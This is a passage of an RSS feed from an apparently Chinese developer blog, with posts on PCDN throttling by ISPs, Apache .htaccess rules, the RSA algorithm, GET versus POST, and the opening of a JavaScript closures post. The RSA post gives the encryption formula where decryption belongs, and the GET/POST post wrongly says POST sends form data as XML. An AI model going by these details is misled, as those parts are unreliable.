title="封杀PCDN的难度"></a>封杀PCDN的难度</h3><p>封杀PCDN，并不是一件容易的事情<br>PCDN传输的数据，同样是视频等业务数据<br>想要区别用户的数据究竟是不是PCDN业务，存在不小挑战<br>如果区分不准确，或者采用“一刀切”，肯定会影响用户的正常上行需求（例如摄像头数据、直播数据、游戏数据等），进而引发大规模投诉，甚至用户流失</p><p>这些年，运营商们普遍开始采用DPI（深度数据包检测）流量识别和QoS限制，对PCDN进行甄别和打压<br>例如，对PCDN业务进行精准识别，正常上行流量不受影响，PCDN流量安排上15%~20%的packet loss（丢包），就能实现PCDN业务的有效扼制</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zh.wikipedia.org/wiki/%E5%B0%8D%E7%AD%89%E7%B6%B2%E8%B7%AF">维基百科：点对点网络</a><br><a href="https://zh.wikipedia.org/wiki/%E5%85%A7%E5%AE%B9%E5%82%B3%E9%81%9E%E7%B6%B2%E8%B7%AF">维基百科：内容分发网络</a><br><a href="https://www.huxiu.com/article/2622679.html">虎嗅：运营商拼命封杀的PCDN，到底是个啥？</a></p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E9%9A%90%E7%A7%81/">隐私</category>
      
      
      <comments>https://zerospace.dev/posts/3bf84f0e/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>htaccess文件格式</title>
      <link>https://zerospace.dev/posts/b4ba338a/</link>
      <guid>https://zerospace.dev/posts/b4ba338a/</guid>
      <pubDate>Fri, 29 Nov 2024 13:54:39 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;https://dimg04.tripcdn.com/images/0Z013224x8xro6e4w4B66.jpg&quot; alt=&quot;htaccess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;htaccess文件简介&quot;&gt;&lt;a href=&quot;#htaccess文件简介&quot; </description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="https://dimg04.tripcdn.com/images/0Z013224x8xro6e4w4B66.jpg" alt="htaccess"></p><h2 id="htaccess文件简介"><a href="#htaccess文件简介" class="headerlink" title="htaccess文件简介"></a>htaccess文件简介</h2><p>htaccess文件是Apache服务器中的一个配置文件，负责相关目录下的网页配置<br>&#x2F;www&#x2F;html下的.htaccess文件与主配置文件中段中内容完全等效<br>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录<br>且子目录中的指令会覆盖父目录或者主配置文件中的指令</p><h2 id="rewrite的语法格式："><a href="#rewrite的语法格式：" class="headerlink" title="rewrite的语法格式："></a>rewrite的语法格式：</h2><ol><li>RewriteEngine On #启用rewrite起作用。</li><li>RewriteBase url-path #设定基准目录。</li><li>RewriteCond test-string condPattern #用于测试rewrite的匹配条件。</li><li>RewriteRule Pattern Substitution #规则</li></ol><h3 id="RewriteEngine-On-Off"><a href="#RewriteEngine-On-Off" class="headerlink" title="RewriteEngine On|Off"></a>RewriteEngine On|Off</h3><p>RewriteEngine 用于开启或停用rewrite功能。rewrite configurations 不会自动继承</p><h3 id="RewriteBase-URL-path"><a href="#RewriteBase-URL-path" class="headerlink" title="RewriteBase URL-path"></a>RewriteBase URL-path</h3><p>RewriteBase用于设定重写的基准URL<br>RewriteRule可以用于目录级的配置文件中 (.htaccess)并在局部范围内起作用<br>即规则实际处理的只是剥离了本地路径前缀的一部分<br>处理结束后，这个路径会被自动地附着回去<br>默认值是”RewriteBase physical-directory-path”</p><h3 id="RewriteCond-TestString-CondPattern-flags"><a href="#RewriteCond-TestString-CondPattern-flags" class="headerlink" title="RewriteCond TestString CondPattern [flags]"></a>RewriteCond TestString CondPattern [flags]</h3><p>RewriteCond指令定义了一个规则的条件，即，在一个RewriteRule指令之前有一个或多个RewriteCond指令<br>条件之后的重写规则仅在当前URI与pattern匹配并且符合这些条件的时候才会起作用<br>TestString是一个纯文本的字符串<br>但是还可以包含下列可扩展的成分:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+RewriteRule反向引用: 引用方法是 $N (0 &lt;= N &lt;= 9) 引用当前(带有若干RewriteCond指令的)RewriteRule中的与pattern匹配的分组成分(圆括号!)</span><br><span class="line">+RewriteCond反向引用: 引用方法是 %N (1 &lt;= N &lt;= 9) 引用当前若干RewriteCond条件中最后符合的条件中的分组成分(圆括号!)</span><br><span class="line">+RewriteMap 扩展: 引用方法是 $&#123;mapname:key|default&#125; + 服务器变量: 引用方法是 %&#123; NAME_OF_VARIABLE &#125; CondPattern是条件参数</span><br><span class="line">Flags标识是是第三个参数,可选OR、AND、NC，默认为AND</span><br></pre></td></tr></table></figure><h3 id="RewriteRule-Pattern-Substitution-Flags"><a href="#RewriteRule-Pattern-Substitution-Flags" class="headerlink" title="RewriteRule Pattern Substitution [Flags]"></a>RewriteRule Pattern Substitution [Flags]</h3><p>其中的Pattern就是参数，一般为一些文件的扩展名<br>Substitution是用来替换前面用的，这儿的Flags<br>常用的R表示 redirect（强制重定向），F表示forbidden（禁止访问），L表示last（最后）<br>通常当你希望停止重写操作而立即重定向时，可用它</p><h2 id="htaccess文件URL重写写法例子"><a href="#htaccess文件URL重写写法例子" class="headerlink" title=".htaccess文件URL重写写法例子"></a>.htaccess文件URL重写写法例子</h2><h3 id="1-反盗链"><a href="#1-反盗链" class="headerlink" title="1. 反盗链"></a>1. 反盗链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteBase /</span><br><span class="line">RewriteCond %&#123;HTTP_REFERER&#125; !^$</span><br><span class="line">RewriteCond %&#123;HTTP_REFERER&#125; !^http://(www.)?yoursite.com/.*$ [NC]</span><br><span class="line">RewriteRule .(gif|jpg|swf|flv|png)$ /feed/ [R=302,L]</span><br></pre></td></tr></table></figure><h3 id="2-防止目录浏览"><a href="#2-防止目录浏览" class="headerlink" title="2. 防止目录浏览"></a>2. 防止目录浏览</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Options All -Indexes</span><br></pre></td></tr></table></figure><h3 id="3-SEO友好的301永久重定向"><a href="#3-SEO友好的301永久重定向" class="headerlink" title="3. SEO友好的301永久重定向"></a>3. SEO友好的301永久重定向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redirect 301 http://www.yoursite.com/article.html http://www.yoursite.com/archives/article</span><br></pre></td></tr></table></figure><h3 id="4-显示个性化的-404-错误页面"><a href="#4-显示个性化的-404-错误页面" class="headerlink" title="4. 显示个性化的 404 错误页面"></a>4. 显示个性化的 404 错误页面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument 404 /404.html</span><br></pre></td></tr></table></figure><h3 id="5-设置目录的默认页面"><a href="#5-设置目录的默认页面" class="headerlink" title="5. 设置目录的默认页面"></a>5. 设置目录的默认页面</h3><p>假如你需要为不同的目录设置不同的默认页面，你可以很容易的通过 .htaccess 实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIndex about.html</span><br></pre></td></tr></table></figure><h3 id="6-基于referer来限制网站访问"><a href="#6-基于referer来限制网站访问" class="headerlink" title="6. 基于referer来限制网站访问"></a>6. 基于referer来限制网站访问</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on  RewriteCond %&#123;HTTP_REFERER&#125; spamteam.com [NC,OR]</span><br><span class="line">RewriteCond %&#123;HTTP_REFERER&#125; trollteam.com [NC,OR]</span><br><span class="line">RewriteRule .* – [F]</span><br><span class="line">&lt;/ifModule&gt;</span><br></pre></td></tr></table></figure><h3 id="7-限制PHP上传文件大小"><a href="#7-限制PHP上传文件大小" class="headerlink" title="7. 限制PHP上传文件大小"></a>7. 限制PHP上传文件大小</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value upload_max_filesize 20M</span><br><span class="line">php_value post_max_size 20M</span><br><span class="line">php_value max_execution_time 200</span><br><span class="line">php_value max_input_time 200</span><br></pre></td></tr></table></figure><h3 id="8-通过压缩文件来减少网络流量"><a href="#8-通过压缩文件来减少网络流量" class="headerlink" title="8. 通过压缩文件来减少网络流量"></a>8. 通过压缩文件来减少网络流量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AddOutputFilterByType DEFLATE text/plain</span><br><span class="line">AddOutputFilterByType DEFLATE text/html</span><br><span class="line">AddOutputFilterByType DEFLATE text/xml</span><br><span class="line">AddOutputFilterByType DEFLATE text/css</span><br><span class="line">AddOutputFilterByType DEFLATE application/xml</span><br><span class="line">AddOutputFilterByType DEFLATE application/xhtml+xml</span><br><span class="line">AddOutputFilterByType DEFLATE application/rss+xml</span><br><span class="line">AddOutputFilterByType DEFLATE application/javascript</span><br><span class="line">AddOutputFilterByType DEFLATE application/x-javascript</span><br></pre></td></tr></table></figure><h3 id="9-缓存文件"><a href="#9-缓存文件" class="headerlink" title="9. 缓存文件"></a>9. 缓存文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “.(flv|gif|jpg|jpeg|png|ico|swf|js|css|pdf)$”&gt;</span><br><span class="line">Header set Cache-Control “max-age=2592000〃</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h3 id="10-添加尾部的反斜杠"><a href="#10-添加尾部的反斜杠" class="headerlink" title="10. 添加尾部的反斜杠"></a>10. 添加尾部的反斜杠</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; /+[^\.]+$</span><br><span class="line">RewriteRule ^(.+[^/])$ %&#123;REQUEST_URI&#125;/ [R=301,L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><h3 id="11-处理移动过的文件"><a href="#11-处理移动过的文件" class="headerlink" title="11. 处理移动过的文件"></a>11. 处理移动过的文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redirect 301 /old.html http://yoursite.com/new.html</span><br></pre></td></tr></table></figure><p>或者是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule /old.html http://yoursite.com/new.html [R=301,L]</span><br></pre></td></tr></table></figure><p>如果想隐式跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule /old.html http://yoursite.com/new.html [L]</span><br></pre></td></tr></table></figure><h3 id="12-html后缀的url链接到php文件"><a href="#12-html后缀的url链接到php文件" class="headerlink" title="12. html后缀的url链接到php文件"></a>12. html后缀的url链接到php文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^/?([a-z/]+)\.html$ $1.php [L]</span><br></pre></td></tr></table></figure><h3 id="13-旧文件夹的内容链接到新文件夹"><a href="#13-旧文件夹的内容链接到新文件夹" class="headerlink" title="13. 旧文件夹的内容链接到新文件夹"></a>13. 旧文件夹的内容链接到新文件夹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^/?old_directory/([a-z/.]+)$ new_directory/$1 [R=301,L]</span><br></pre></td></tr></table></figure><h3 id="14-隐藏文件名"><a href="#14-隐藏文件名" class="headerlink" title="14. 隐藏文件名"></a>14. 隐藏文件名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^/?([a-z]+)$ $1.php [L]</span><br></pre></td></tr></table></figure><h3 id="15-阻止-允许特定IP-IP段"><a href="#15-阻止-允许特定IP-IP段" class="headerlink" title="15. 阻止&#x2F;允许特定IP&#x2F;IP段"></a>15. 阻止&#x2F;允许特定IP&#x2F;IP段</h3><p>禁止所有IP，除了指定的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order deny,allow</span><br><span class="line">deny from all</span><br></pre></td></tr></table></figure><p>如果想允许IP段，如123.123.123.0 ~ 123.123.123.255，则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allow from 123.123.123.</span><br><span class="line">allow from 123.123.123.123</span><br><span class="line"></span><br><span class="line">ErrorDocument 403 /page.html</span><br><span class="line"></span><br><span class="line">&lt;Files page.html&gt;</span><br><span class="line">allow from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><p>如果想禁止特定IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deny from 123.123.123.123</span><br></pre></td></tr></table></figure><h3 id="16-添加MIME类型"><a href="#16-添加MIME类型" class="headerlink" title="16. 添加MIME类型"></a>16. 添加MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType video/x-flv .flv</span><br></pre></td></tr></table></figure><p>如果设置类型为 application&#x2F;octet-stream 将提示下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/octet-stream .pdf</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      <category domain="https://zerospace.dev/tags/Linux/">Linux</category>
      
      
      <comments>https://zerospace.dev/posts/b4ba338a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RSA加密算法简介</title>
      <link>https://zerospace.dev/posts/59d9dfef/</link>
      <guid>https://zerospace.dev/posts/59d9dfef/</guid>
      <pubDate>Thu, 28 Nov 2024 03:22:24 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;RSA加密算法是一种非对称加密算法，在公开密钥加密和电子商业中被广泛使用。RSA是由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>RSA加密算法是一种非对称加密算法，在公开密钥加密和电子商业中被广泛使用。RSA是由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）在1977年一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>在数论中，对正整数n，欧拉函数$\displaystyle \varphi (n)$是小于等于$\displaystyle n$的正整数中与$\displaystyle n$互质的数的数目。例如$\displaystyle \varphi \left(8\right)&#x3D;4$，因为1、3、5和7均与8互质。<br>欧拉函数是积性函数，即是说若$\displaystyle m,n$互质，则：<br>$$\displaystyle \varphi (mn)&#x3D;\varphi (m)\varphi (n)<br>$$<br>使用中国剩余定理有较简略的证明：设$\displaystyle A,B,C$是跟$\displaystyle m,n ,mn$互质的数的集，据中国剩余定理，$\displaystyle A\times B$和$\displaystyle C$可建立双射（一一对应）关系，因此两者元素个数相等</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>在数论中，欧拉定理（也称费马-欧拉定理）是一个关于同余的性质。欧拉定理表明，若$\displaystyle n,a$为正整数，且$\displaystyle n,a$互素（即$\displaystyle \gcd(a,n)&#x3D;1$），则：<br>$$\displaystyle a^{\varphi (n)}\equiv 1{\pmod {n}}<br>$$<br>即$\displaystyle a^{\varphi (n)}$与$\displaystyle 1$在模$\displaystyle n$下同余。欧拉定理实际上是费马小定理的推广</p><h3 id="模逆元"><a href="#模逆元" class="headerlink" title="模逆元"></a>模逆元</h3><p>模逆元（Modular multiplicative inverse）也称为模倒数、数论倒数。<br>一整数$\displaystyle a$对同余$\displaystyle n$之模逆元是指满足以下公式的整数$\displaystyle b$：<br>$$\displaystyle a^{-1}\equiv b{\pmod {n}}.<br>$$<br>也可以写成$\displaystyle ab\equiv 1{\pmod {n}}$或者$\displaystyle ab\mod {n}&#x3D;1$。<br>整数$\displaystyle a$对模数$\displaystyle n$之模逆元存在的充分必要条件是$\displaystyle a$和$\displaystyle n$互素，若此模逆元存在，在模数$\displaystyle n$下的除法可以用和对应模逆元的乘法来达成，此概念和实数除法的概念相同</p><h2 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h2><h3 id="公钥与私钥的产生"><a href="#公钥与私钥的产生" class="headerlink" title="公钥与私钥的产生"></a>公钥与私钥的产生</h3><p>假设Alice想要通过不可靠的媒体接收Bob的私人消息。她可以用以下的方式来产生一个公钥和一个私钥：</p><ol><li>随意选择两个大的素数$\displaystyle p$和$\displaystyle q$，$\displaystyle p$不等于$\displaystyle q$，计算$\displaystyle N&#x3D;pq$。</li><li>根据欧拉函数，求得$\displaystyle r&#x3D;\varphi (N)&#x3D;\varphi (p)\times \varphi (q)&#x3D;(p-1)(q-1)$。</li><li>选择一个小于$\displaystyle r$的整数$\displaystyle e$，使$\displaystyle e$与$\displaystyle r$互质。并求得$\displaystyle e$关于$\displaystyle r$的模逆元，命名为$\displaystyle d$（求$\displaystyle d$令$\displaystyle ed\equiv 1{\pmod {r}}$）。（模逆元存在，当且仅当$\displaystyle e$与$\displaystyle r$互质。）</li><li>将$\displaystyle p$和$\displaystyle q$的记录销毁</li></ol><p>其中，$\displaystyle (N,e)$是公钥，$\displaystyle (N,d)$是私钥。Alice将她的公钥$\displaystyle (N,e)$传给Bob，而将她的私钥$\displaystyle (N,d)$藏起来</p><h3 id="加密消息"><a href="#加密消息" class="headerlink" title="加密消息"></a>加密消息</h3><p>假设Bob想给Alice送消息$\displaystyle m$，他知道Alice产生的$\displaystyle N$和$\displaystyle e$。他使用起先与Alice约好的格式将$\displaystyle m$转换为一个小于$\displaystyle N$的非负整数$\displaystyle n$，比如他可以将每一个字转换为这个字的Unicode码，然后将这些数字连在一起组成一个数字。假如他的信息非常长的话，他可以将这个信息分为几段，然后将每一段转换为$\displaystyle n$。用下面这个公式他可以将$\displaystyle n$加密为$\displaystyle c$：<br>$$\displaystyle c&#x3D;n^{e}{\bmod {N}}<br>$$<br>这里的$\displaystyle c$可以用模幂算法快速求出来。Bob算出$\displaystyle c$后就可以将它传递给Alice</p><h3 id="解密消息"><a href="#解密消息" class="headerlink" title="解密消息"></a>解密消息</h3><p>Alice得到Bob的消息$\displaystyle c$后就可以利用她的密钥$\displaystyle d$来解码。她可以用以下这个公式来将$\displaystyle c$转换为$\displaystyle n$：<br>$$\displaystyle c&#x3D;n^{e}{\bmod {N}}<br>$$<br>与Bob计算$\displaystyle c$类似，这里的$\displaystyle n$也可以用模幂算法快速求出。得到$\displaystyle n$后，她可以将原来的信息$\displaystyle m$重新复原<br>解码的原理是<br>$$\displaystyle c^{d}\equiv n^{e\cdot d}\ (\mathrm {mod} \ N)<br>$$<br>已知$\displaystyle ed\equiv 1{\pmod {r}}$，即 $\displaystyle ed&#x3D;1+h\varphi (N)$。那么有<br>$$\displaystyle n^{ed}&#x3D;n^{1+h\varphi (N)}&#x3D;n\cdot n^{h\varphi (N)}&#x3D;n\left(n^{\varphi (N)}\right)^{h}<br>$$</p><p>若$\displaystyle n$与$\displaystyle N$互素，则由欧拉定理得：</p><p>$$\displaystyle n^{ed}\equiv n\left(n^{\varphi (N)}\right)^{h}\equiv n(1)^{h}\equiv n{\pmod {N}}<br>$$</p><p>若$\displaystyle n$与$\displaystyle N$不互素，则不失一般性考虑$\displaystyle n&#x3D;ph$，以及$\displaystyle ed-1&#x3D;k(q-1)$，得：</p><p>$$\displaystyle n^{ed}&#x3D;(ph)^{ed}\equiv 0\equiv ph\equiv n{\pmod {p}}<br>$$<br>$$\displaystyle n^{ed}&#x3D;n^{ed-1}n&#x3D;n^{k(q-1)}n&#x3D;(n^{q-1})^{k}n\equiv 1^{k}n\equiv n{\pmod {q}}<br>$$<br>故$\displaystyle n^{ed}\equiv n{\pmod {N}}$得证</p><h3 id="签名消息"><a href="#签名消息" class="headerlink" title="签名消息"></a>签名消息</h3><p>RSA也可以用来为一个消息署名。假如Alice想给Bob传递一个署名的消息的话，那么她可以为她的消息计算一个散列值（Message digest），然后用她的私钥“加密”（如同前面“加密消息”的步骤）这个散列值并将这个“署名”加在消息的后面。这个消息只有用她的公钥才能被解密。Bob获得这个消息后可以用Alice的公钥“解密”（如同前面“解密消息”的步骤）这个散列值，然后将这个数据与他自己为这个消息计算的散列值相比较。假如两者相符的话，那么Bob就可以知道发信人持有Alice的私钥，以及这个消息在传播路径上没有被篡改过</p><h2 id="RSA安全性"><a href="#RSA安全性" class="headerlink" title="RSA安全性"></a>RSA安全性</h2><p>假设偷听者Eve获得了Alice的公钥$\displaystyle N$和$\displaystyle e$以及Bob的加密消息$\displaystyle c$，但她无法直接获得Alice的密钥$\displaystyle d$。要获得$\displaystyle d$，最简单的方法是将$\displaystyle N$分解为$\displaystyle p$和$\displaystyle q$，这样她可以得到同余方程<br>$$\displaystyle de\equiv 1(\mathrm {mod} (p-1)(q-1))<br>$$<br>并解出$\displaystyle d$，然后代入解密公式<br>$$\displaystyle c^{d}\equiv n\ (\mathrm {mod} \ N)<br>$$<br>导出$\displaystyle n$（破密）<br>至今为止还没有人找到一个多项式时间的算法来分解一个大的整数的因子，也没有找到比因数分解更简单的破密方法。因此今天一般认为只要$\displaystyle N$足够大，黑客就没有办法破解<br>NIST建议的RSA密钥长度为至少2048位。实现上，强制设置密钥长度为2048位的称RSA或RSA2（意即RSA version 2），而未强制设置的称RSA1以资区别，两者差异主要在密钥长度</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>维基百科：<a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0">欧拉函数</a><br>维基百科：<a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86_(%E6%95%B0%E8%AE%BA)">欧拉定理（数论）</a><br>维基百科：<a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0">模逆元</a><br>维基百科：<a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%B9%82">模幂</a><br>维基百科：<a href="https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">RSA加密算法</a></p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      <category domain="https://zerospace.dev/tags/%E5%AE%89%E5%85%A8/">安全</category>
      
      <category domain="https://zerospace.dev/tags/RSA/">RSA</category>
      
      <category domain="https://zerospace.dev/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</category>
      
      
      <comments>https://zerospace.dev/posts/59d9dfef/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HTTP中Get与POST请求的区别</title>
      <link>https://zerospace.dev/posts/e7333bc5/</link>
      <guid>https://zerospace.dev/posts/e7333bc5/</guid>
      <pubDate>Tue, 26 Nov 2024 09:10:37 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;给服务器传递数据量&quot;&gt;&lt;a href=&quot;#给服务器传递数据量&quot; class=&quot;headerlink&quot; title=&quot;给服务器传递数据量&quot;&gt;&lt;/a&gt;给服务器传递数据量&lt;/h2&gt;&lt;p&gt;get方式的大小是受限于浏览器的，大部分浏览器是2k的限制&lt;/p&gt;
&lt;p&gt;每一个浏览</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="给服务器传递数据量"><a href="#给服务器传递数据量" class="headerlink" title="给服务器传递数据量"></a>给服务器传递数据量</h2><p>get方式的大小是受限于浏览器的，大部分浏览器是2k的限制</p><p>每一个浏览器的限制是不一样的 Chrome的限制是8K</p><ul><li>http:&#x2F;&#x2F;网址&#x2F;index.php?name&#x3D;tom</li><li>上述请求get方式传递了9个字节的信息</li><li>1024字节 &#x3D; 1k</li></ul><p>post原则没有限制，php.ini最其限制为8M</p><h2 id="安全方面"><a href="#安全方面" class="headerlink" title="安全方面"></a>安全方面</h2><p>POST传输数据相对来说比较安全</p><h2 id="传输数据的形式不一样"><a href="#传输数据的形式不一样" class="headerlink" title="传输数据的形式不一样"></a>传输数据的形式不一样</h2><ul><li>Get方式在url地址后面以请求字符串的形式传递参数</li><li>http:&#x2F;&#x2F;网址&#x2F;index.php?name&#x3D;tom&amp;age&#x3D;23&amp;addr&#x3D;DZU</li><li>蓝色部分就是请求字符串，就是一些“名-值”对，中间使用 &amp; 符号链接</li><li>post方式是把from表单的数据请求出来以XML方式传递给服务器</li></ul>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      
      <comments>https://zerospace.dev/posts/e7333bc5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>JavaScript闭包原理与垃圾回收机制</title>
      <link>https://zerospace.dev/posts/65ea687a/</link>
      <guid>https://zerospace.dev/posts/65ea687a/</guid>
      <pubDate>Sun, 24 Nov 2024 12:04:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;JavaScript中的闭包是指能够访问其他函数作用域内变量的函数，即一个函数内部的函数&lt;br&gt;闭包是一种保护私有变量的机制，在函数执行时形成私有的作用域，保护里面的私有变量不受外界干扰，即形成一个不销毁的栈环境&lt;br&gt;但由于闭包会使得函数中的变量都被保存在内存中，所以滥用</description>
        
      
      
      
      <content:encoded><![CDATA[<p>JavaScript中的闭包是指能够访问其他函数作用域内变量的函数，即一个函数内部的函数<br>闭包是一种保护私有变量的机制，在函数执行时形成私有的作用域，保护里面的私有变量不受外界干扰，即形成一个不销毁的栈环境<br>但由于闭包会使得函数中的变量都被保存在内存中，所以滥用闭包会造成性能问题或是导致内存泄漏</p><h2 id="JavaScript闭包简介"><a href="#JavaScript闭包简介" class="headerlink" title="JavaScript闭包简介"></a>JavaScript闭包简介</h2><p>首先来看一个简单的例子: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var a = 1;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">fn1</span></span>() &#123;</span><br><span class="line">  a += 1;</span><br><span class="line">  <span class="built_in">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">//函数中的a为全局变量</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">fn2</span></span>() &#123;</span><br><span class="line">  var a = 1;</span><br><span class="line">  a += 1;</span><br><span class="line">  <span class="built_in">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">//函数中的a为局部变量</span><br><span class="line">fn1();</span><br><span class="line">console.log(fn1());</span><br><span class="line">//控制台输出3</span><br><span class="line">fn2();</span><br><span class="line">console.log(fn2());</span><br><span 